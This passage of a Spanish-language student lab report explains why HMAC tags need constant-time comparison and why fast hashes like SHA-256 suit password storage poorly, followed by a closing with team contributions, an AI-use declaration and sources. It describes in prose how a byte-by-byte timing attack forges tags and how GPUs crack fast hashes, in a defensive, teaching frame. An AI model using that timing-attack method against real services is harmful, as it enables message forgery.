  https://www.rfc-editor.org/rfc/rfc6151 *(primaria)*

### 4. Comparación en tiempo constante

**Respuesta:**

El `==` de cadenas (y `memcmp` en C) está optimizado para devolver `False`
**en cuanto encuentra el primer byte distinto**. El tiempo de la comparación
es entonces proporcional a la longitud del prefijo correcto. Si el servidor
compara el tag que envía el cliente contra el tag correcto con `==`, un tag
cuyo primer byte acierta tarda un poco más en rechazarse que uno que falla en
el primer byte. Esa diferencia (nanosegundos por byte) es un **canal lateral
de tiempo**: filtra información sobre el secreto sin que el atacante vea
nunca el tag correcto.

El ataque concreto es una **falsificación de tag byte a byte**. El atacante
quiere que el servidor acepte un mensaje elegido por él (p. ej. "transferir
1000000") sin conocer la clave. Envía ese mensaje con 256 tags que sólo
difieren en el primer byte, repitiendo cada envío miles de veces y midiendo
el tiempo de respuesta; el candidato con mayor tiempo promedio es el primer
byte correcto. Fija ese byte y repite con el segundo. Para un tag de 32
bytes son como máximo 32 × 256 = 8192 candidatos (por las repeticiones
estadísticas), en lugar de 2^256: el ataque pasa de imposible a lineal. Al
final tiene un tag válido para un mensaje que nunca firmó nadie, sin haber
recuperado la clave. No es teórico: así se rompió la verificación del HMAC
del bootloader de la Xbox 360 (comparación con `memcmp`) y Nate Lawson
reportó la misma falla en la biblioteca Keyczar de Google en 2009; Lawson y
Nelson (Black Hat 2010) mostraron que el ruido de red se promedia con
suficientes muestras, incluso remotamente.

`hmac.compare_digest()` evita esto porque **recorre siempre todos los bytes**
sin cortar al primer error: acumula las diferencias con XOR/OR
(`resultado |= a[i] ^ b[i]`) y sólo al final decide. El tiempo depende de la
longitud de las entradas, no de dónde está la primera diferencia, así que el
tiempo de respuesta no aporta información sobre cuántos bytes acertó el
atacante. La documentación de Python lo describe justamente como una función
que "reduce la vulnerabilidad a ataques de tiempo". La longitud sí puede
filtrarse, pero en HMAC la longitud del tag es pública (32 bytes), así que no
revela nada.

### 5. SHA-256 para contraseñas: mala idea

**Respuesta:**

El problema no es que SHA-256 sea inseguro sino que es **rápido**, y lo es
por diseño: fue pensado para hashear gigabytes de datos. Cuando se roba una
base de hashes de contraseñas, el atacante no necesita invertir SHA-256: le
alcanza con **adivinar** (diccionario, reglas de mutación, fuerza bruta sobre
el espacio, que en contraseñas humanas es chico) y hashear cada candidato
para comparar. Una GPU moderna calcula miles de millones de SHA-256 por
segundo, y el hardware especializado (ASIC de minería de Bitcoin, que hace
justamente SHA-256 doble) muchos órdenes más. Con esa velocidad, toda
contraseña de 8 caracteres o que aparezca en un diccionario de filtraciones
cae en minutos u horas. Si además se hashea sin **sal**, dos usuarios con la
misma contraseña tienen el mismo hash y se pueden usar tablas precalculadas
(rainbow tables) para atacar a todos los usuarios a la vez.

En su lugar se usan **funciones de derivación de claves para contraseñas**
(*password hashing functions*): **Argon2id** (ganadora de la Password Hashing
Competition 2015, especificada en el RFC 9106), **scrypt** (RFC 7914),
**bcrypt** y, donde se exige FIPS, **PBKDF2** con muchas iteraciones. Todas
incorporan una **sal aleatoria por usuario** (que anula las tablas
precalculadas y obliga a atacar cada cuenta por separado) y, sobre todo, un
**factor de costo configurable**: son deliberadamente lentas (decenas o
cientos de milisegundos por intento), y ese costo se puede subir con los
años a medida que el hardware mejora. Para el usuario legítimo, 100 ms en el
login no se nota; para el atacante, multiplica el costo de cada intento por
un factor de 10^5 o más.

La propiedad decisiva que SHA-256 no tiene es la **dureza en memoria**
(*memory-hardness*) de Argon2id y scrypt: cada evaluación necesita una
cantidad grande de RAM (decenas o cientos de MiB) y accesos dependientes a
ella. Eso neutraliza la ventaja de las GPU y ASIC, que tienen muchísimos
núcleos pero poca memoria por núcleo: ya no se pueden correr miles de
intentos en paralelo. bcrypt usa una cantidad moderada de memoria que
también le complica la vida a las GPU. OWASP recomienda hoy Argon2id como
primera opción (con parámetros mínimos del orden de 19 MiB de memoria y 2
iteraciones), scrypt si no está disponible, bcrypt para sistemas legados, y
PBKDF2 con 600.000 iteraciones de HMAC-SHA256 si hace falta cumplimiento
FIPS-140.

---

# Cierre

## Dificultades encontradas

- **Parte A — separar gravedad de propiedad violada.** El primer borrador
  marcaba integridad como violada porque el malware se instaló en los POS.
  Lo discutimos: lo alterado fue el software de las terminales, no el dato
  de tarjeta, que es el activo principal. Terminamos distinguiendo el activo
  (track data) del medio (las terminales) y justificándolo en A.3.
- **Parte A — fuentes.** Muchas notas periodísticas repiten cifras sin
  citar de dónde salen. Usamos como fuente principal el informe *kill chain*
  del Senado y los comunicados de Target, y dejamos a Krebs y Bloomberg solo
  para hechos que esas fuentes no cubren.
- **Parte B — excluir el manifiesto.** Cuando el manifiesto queda dentro
  del directorio recorrido, `verificar` lo reportaba como `NUEVO`. Lo
  resolvimos comparando rutas con `Path.resolve()`, que normaliza rutas
  relativas y `..`.
- **Parte B — bits contra hex.** La primera idea fue comparar las cadenas
  hexadecimales carácter por carácter; daba números cercanos a 60 de 64, que
  no tienen sentido como "efecto avalancha" en bits. Pasamos a XOR sobre
  `digest()` y `int.bit_count()`.
- **Mini-research — recorte.** El tema post-cuántico tiene mucho ruido; lo
  más difícil fue dejar afuera lo que no está en los documentos del NIST y
  mantenernos entre 800 y 1000 palabras.

---

## Distribución del trabajo


| Integrante | Aportes |
|---|---|
| Marco Cordoba | Parte A completa: cronología, activo, matriz CIA, encadenamiento, controles y fuentes. |
| Thomas Koncurat | Mini-research (tema 4, criptografía post-cuántica) y cierre del informe. |
| Lucas Leone | *(completar con su aporte; necesita un commit propio en la rama)* |
| Geronimo Marquez | Implementación de los cuatro `TODO` de `integridad.py`, evidencia de ejecución y preguntas de análisis de la Parte B. |
| Joaquin Moyano | Estructura del directorio de entrega, copia de los recursos del laboratorio y `INTEGRANTES.md`. |

---

## Declaración de uso de asistentes de IA

> **Obligatoria.** No está prohibido usar asistentes de IA. Lo que se evalúa es
> que entiendan lo que entregan. La omisión de esta declaración es **causal de
> rechazo automático** de la entrega. Una declaración honesta no baja la nota.

**¿El grupo usó asistentes de IA en este trabajo?**  Sí

| Herramienta | Para qué se usó | Qué partes del entregable afectó | Cómo se verificó que lo devuelto era correcto |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Implementación de los cuatro `TODO` de `integridad.py`, ejecución de las pruebas y redacción de la Parte B del informe. | `src/integridad.py`; secciones B.1, B.2 y B.3 de este informe. | Se corrieron todas las pruebas del enunciado (incluida la de un byte) y casos adicionales (manifiesto dentro del directorio, `ValueError` por largos distintos, tag no ASCII); las salidas pegadas son las reales. El grupo revisó el código línea por línea. |
| Claude (Anthropic), vía Claude Code | Borrador del mini-research y del cierre del informe (dificultades y distribución del trabajo). | `research.md`; sección Cierre de este informe. | Cada integrante revisó el texto; se entró a cada referencia del mini-research para confirmar que existe y respalda lo citado. |

**Declaración:**

El grupo declara que comprende el contenido íntegro de lo entregado y que
puede explicar y defender oralmente cualquier parte del código y del análisis,
independientemente de la asistencia recibida.

---

## Fuentes consultadas (general)

Las fuentes de la Parte A están en la sección A.6 (referencias [1] a [11]).
Las de la Parte B son las siguientes:

1. National Institute of Standards and Technology. (2015). *FIPS PUB 180-4:
   Secure Hash Standard (SHS)*. https://doi.org/10.6028/NIST.FIPS.180-4 *(primaria)*
2. Krawczyk, H., Bellare, M., & Canetti, R. (1997). *RFC 2104: HMAC:
   Keyed-hashing for message authentication*. IETF.
   https://www.rfc-editor.org/rfc/rfc2104 *(primaria)*
3. Stevens, M., Bursztein, E., Karpman, P., Albertini, A., & Markov, Y. (2017).
   The first collision for full SHA-1. En *Advances in Cryptology – CRYPTO
   2017* (pp. 570–596). Springer. https://shattered.io/ *(primaria, arbitrada)*
4. Wang, X., & Yu, H. (2005). How to break MD5 and other hash functions. En
   *Advances in Cryptology – EUROCRYPT 2005* (pp. 19–35). Springer. *(primaria, arbitrada)*
5. Leurent, G., & Peyrin, T. (2020). SHA-1 is a Shambles. En *29th USENIX
   Security Symposium*. https://sha-mbles.github.io/ *(primaria, arbitrada)*
6. Turner, S., & Chen, L. (2011). *RFC 6151: Updated security considerations
   for the MD5 message-digest and the HMAC-MD5 algorithms*. IETF.
   https://www.rfc-editor.org/rfc/rfc6151 *(primaria)*
7. Biryukov, A., Dinu, D., Khovratovich, D., & Josefsson, S. (2021). *RFC 9106:
   Argon2 memory-hard function for password hashing and proof-of-work
   applications*. IETF. https://www.rfc-editor.org/rfc/rfc9106 *(primaria)*
8. OWASP Foundation. (s. f.). *Password storage cheat sheet*. OWASP Cheat Sheet
   Series. https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html *(secundaria)*
9. Python Software Foundation. (s. f.). *hmac — Keyed-hashing for message
   authentication*. Python 3 documentation.
   https://docs.python.org/3/library/hmac.html *(primaria)*
10. Lawson, N., & Nelson, T. (2010). *Exploiting timing attacks in widespread
    systems for fun and profit* [Presentación]. Black Hat USA 2010. *(secundaria)*
